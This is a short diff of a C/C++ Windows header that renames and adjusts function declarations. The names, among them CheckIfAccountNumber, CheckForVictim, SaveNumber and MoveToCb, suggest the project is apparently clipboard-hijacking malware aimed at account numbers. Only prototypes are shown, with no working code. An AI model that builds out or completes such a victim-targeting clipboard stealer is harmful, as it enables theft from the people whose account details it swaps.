@@ -11,5 +11,5 @@ bool init(HINSTANCE hInstance);
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
 void MoveToCb();
 bool CheckIfAccountNumber(LPSTR str);
-void checkForVictim();
-void saveNumber();
+void CheckForVictim();
+void SaveNumber(LPARAM num);
